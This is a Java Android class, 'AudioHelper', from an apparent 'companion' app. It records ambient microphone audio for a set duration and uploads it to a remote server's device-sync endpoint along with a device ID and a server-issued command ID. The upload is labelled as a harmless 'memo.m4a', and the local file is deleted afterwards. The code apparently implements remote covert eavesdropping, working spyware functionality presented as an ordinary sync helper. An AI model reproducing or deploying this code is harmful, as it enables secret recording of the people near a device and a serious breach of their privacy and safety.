package com.snapapp.companion;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class AudioHelper {
    public interface AudioCallback {
        void onComplete();
        void onError(String error);
    }

    public static void recordAndUpload(final Context context, final String serverUrl, final String deviceId,
                                       final String commandId, final int durationSeconds, final AudioCallback callback) {
        final File outputFile = new File(context.getCacheDir(), "ambient_" + System.currentTimeMillis() + ".m4a");
        final MediaRecorder recorder = new MediaRecorder();

        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(16000);
            recorder.setAudioEncodingBitRate(32000);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            // Schedule stop and upload
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        recorder.stop();
                        recorder.release();
                        uploadAudioFile(serverUrl, deviceId, commandId, durationSeconds, outputFile, callback);
                    } catch (Exception e) {
                        try { recorder.release(); } catch (Exception ignored) {}
                        outputFile.delete();
                        if (callback != null) callback.onError(e.getMessage());
                    }
                }
            }, durationSeconds * 1000L);

        } catch (Exception e) {
            try { recorder.release(); } catch (Exception ignored) {}
            outputFile.delete();
            if (callback != null) callback.onError(e.getMessage());
        }
    }

    private static void uploadAudioFile(final String serverUrl, final String deviceId, final String commandId,
                                        final int duration, final File file, final AudioCallback callback) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String boundary = "===" + System.currentTimeMillis() + "===";
                    URL url = new URL(serverUrl + "/api/device-sync/upload-audio");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = conn.getOutputStream();
                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);

                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n");
                    writer.append(deviceId).append("\r\n");

                    if (commandId != null) {
                        writer.append("--").append(boundary).append("\r\n");
                        writer.append("Content-Disposition: form-data; name=\"command_id\"\r\n\r\n");
                        writer.append(commandId).append("\r\n");
                    }

                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n");
                    writer.append(String.valueOf(duration)).append("\r\n");

                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"audio\"; filename=\"memo.m4a\"\r\n");
                    writer.append("Content-Type: audio/mp4\r\n\r\n");
                    writer.flush();

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                    os.flush();
                    fis.close();

                    writer.append("\r\n").flush();
                    writer.append("--").append(boundary).append("--\r\n");
                    writer.close();

                    conn.getResponseCode();
                    conn.disconnect();
                    file.delete();

                    if (callback != null) callback.onComplete();
                } catch (Exception e) {
                    file.delete();
                    if (callback != null) callback.onError(e.getMessage());
                }
            }
        }).start();
    }
}
